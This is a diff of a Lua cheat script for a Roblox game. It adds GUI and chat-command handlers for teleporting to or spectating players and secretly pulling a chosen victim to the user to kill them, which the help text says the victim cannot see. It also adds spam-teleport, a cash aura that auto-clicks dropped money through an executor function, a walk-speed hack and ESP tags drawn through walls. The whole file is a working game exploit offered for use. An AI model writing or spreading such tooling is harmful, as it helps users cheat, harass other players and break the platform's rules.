 			if (string.lower(input) == string.sub(string.lower(plr.Name), 1, #input)) then
@@ -1112,6 +981,64 @@ game.Players.LocalPlayer.Chatted:Connect(function(m1)
 			end
 		end
 	end
+	if text == Pname then
+		local text_1 = Pname.Text
+		local plr = GetPlayer(text_1)
+		if plr then
+			local PINFO = Pinfo
+			PINFO.User.Text = plr.Name
+			PINFO.Display.Text = plr.DisplayName
+			PINFO.ImageLabel.Image = game.Players:GetUserThumbnailAsync(plr.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
+			wait()
+			PINFO.Visible = true
+		else
+			script.Parent.Parent.Pinfo.Visible = false
+		end
+	end
+end)
+Teleport.MouseButton1Click:Connect(function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace:FindFirstChild(User.Text).HumanoidRootPart.CFrame
+end)
+Spectate.MouseButton1Click:Connect(function()
+	workspace.CurrentCamera.CameraSubject = workspace:FindFirstChild(User.Text).Humanoid
+end)
+Stop.MouseButton1Click:Connect(function()
+	_G.Attacking = false
+end)
+Katana.MouseButton1Click:Connect(function()
+	_G.Attacking = true
+	repeat wait()
+		workspace:FindFirstChild(User.Text).HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-.5,-2.5)
+	until _G.Attacking == false or workspace:FindFirstChild(User.Text).Humanoid.Health < .5
+end)
+SpamTeleport.MouseButton1Click:Connect(function()
+	_G.Attacking = true
+	repeat wait()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace:FindFirstChild(User.Text).HumanoidRootPart.CFrame 
+	until _G.Attacking == false or workspace:FindFirstChild(User.Text).Humanoid.Health < .5
+end)
+workspace.ChildAdded:Connect(function(child)
+	if cashaura.Value == false then return end
+	if child.Name == "Money" then
+		fireclickdetector(child.ClickDetector)
+	end
+end)
+CashAura.MouseButton1Click:Connect(function()
+	cashaura.Value = true
+end)
+prefix.Changed:Connect(function()
+	cmds_2.Text = prefix.Value.."stop - Stops everything."
+	cmds_3.Text = prefix.Value.."start [Player] - Spam teleports you to the selected player."
+	cmds_4.Text = prefix.Value.."katana [Player] - Spam brings the selected player to you so you can spam katana on them. (Does not work with guns) (They cant see that you are bringing them)"
+	cmds_5.Text = prefix.Value.."to [Player] - Teleports you to a player."
+	cmds_6.Text = prefix.Value.."prefix [String] - Changes the prefix for the commands."
+end)
+--COMMANDS
+game.Players.LocalPlayer.Chatted:Connect(function(m1)
+	if S1.CommandsEnabled.Value == false then return end
+	if not  workspace:FindFirstChild(game.Players.LocalPlayer.Name) then return end
+	if not  workspace:FindFirstChild(game.Players.LocalPlayer.Name):FindFirstChild("HumanoidRootPart") then return end
+	local HRP = game.Players.LocalPlayer.Character.HumanoidRootPart
 	local msg = string.split(m1, " ")
 	if msg[1] == prefix.Value.."stop" then
 		_G.Attacking = false
@@ -1133,5 +1060,109 @@ game.Players.LocalPlayer.Chatted:Connect(function(m1)
 		HRP.CFrame = char.HumanoidRootPart.CFrame * CFrame.new(0,-.5,-2.5)
 	elseif msg[1] == prefix.Value.."prefix" then
 		prefix.Value = msg[2]
+	end
+end)
+--TOGGLES HANDLERS
+local SpeedValue = 100
+local esp = false
+AutoMask.MouseButton1Click:Connect(function()
+	automask.Value = not automask.Value
+	if automask.Value == true then
+		AutoMask.BackgroundColor3 = Color3.fromRGB(51, 111, 11)
+	else
+		AutoMask.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+	end
+end)
+CashAura.MouseButton1Click:Connect(function()
+	cashaura.Value = not cashaura.Value
+	if cashaura.Value == true then
+		CashAura.BackgroundColor3 = Color3.fromRGB(51, 111, 11)
+	else
+		CashAura.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+	end
+end)
+Speed_2.MouseButton1Click:Connect(function()
+	speed.Value = not speed.Value
+	if speed.Value == true then
+		Speed_2.BackgroundColor3 = Color3.fromRGB(51, 111, 11)
+	else
+		Speed_2.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+	end
+end)
+Speed.MouseButton1Click:Connect(function()
+	SpeedValue -= 50
+end)
+Speed_3.MouseButton1Click:Connect(function()
+	SpeedValue += 50
+end)
+ESP.MouseButton1Click:Connect(function()
+	esp = not esp
+	if esp == true then
+		ESP.BackgroundColor3 = Color3.fromRGB(51, 111, 11)
+		for i,v in pairs(workspace:GetChildren()) do
+			if v:IsA("Model") then
+				if v:FindFirstChild("Humanoid") then
+					local BBG = Instance.new("BillboardGui")
+					local ESPTEXT = Instance.new("TextLabel")
+					ESPTEXT.Text = v.Name.." ("..game.Players:GetPlayerFromCharacter(v).DisplayName..")"
+					BBG.Parent = v.UpperTorso
+					BBG.AlwaysOnTop = true
+					ESPTEXT.Parent = BBG
+					BBG.Size = UDim2.new(0, 200,0, 50)
+					BBG.Name = "esp"
+					ESPTEXT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+					ESPTEXT.BackgroundTransparency = 1.000
+					ESPTEXT.Size = UDim2.new(0, 200, 0, 50)
+					ESPTEXT.Font = Enum.Font.SourceSans
+					ESPTEXT.TextColor3 = Color3.fromRGB(255, 255, 255)
+					ESPTEXT.TextSize = 20.000
+					ESPTEXT.TextStrokeTransparency = 0.000
+				end
+			end
+		end
+	else
+	ESP.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+		for i,v in pairs(workspace:GetChildren()) do
+			if v:IsA("Model") then
+				if v:FindFirstChild("Humanoid") then
+					if v.UpperTorso:FindFirstChild("esp") then
+						v.UpperTorso:FindFirstChild("esp"):Destroy()
+					end
+				end
+			end
+		end
+	end
+end)
+UIS.InputBegan:Connect(function(inp)
+	if inp.KeyCode == Enum.KeyCode.C then
+		if speed.Value == true then
+			_G.Speed = true
+			repeat wait()
+				game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = SpeedValue
+			until _G.Speed == false
+			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
+		end
+	end
+end)
+UIS.InputEnded:Connect(function(inp)
+	if inp.KeyCode == Enum.KeyCode.C then
+		_G.Speed = false
+	end
+end)
+local selected = false
+TextButton.MouseButton1Click:Connect(function()
+	local Yes = {Position = UDim2.new(-0.017, 0,0, 0)}
+	local No = {Position = UDim2.new(0.456, 0,0, 0),}
+	local Yes2 = {BackgroundColor3 = Color3.fromRGB(48, 218, 18)}
+	local No2 = {BackgroundColor3 = Color3.fromRGB(132, 132, 132)}
+	selected = not selected
+	if selected == true then
+		TweenService:Create(TextButton, info, Yes):Play()
+		TweenService:Create(TextButton.Parent, info, Yes2):Play()
+		S1.CommandsEnabled.Value = true
+	else
+		TweenService:Create(TextButton, info, No):Play()
+		TweenService:Create(TextButton.Parent, info, No2):Play()
+		S1.CommandsEnabled.Value = false
 	end
 end)
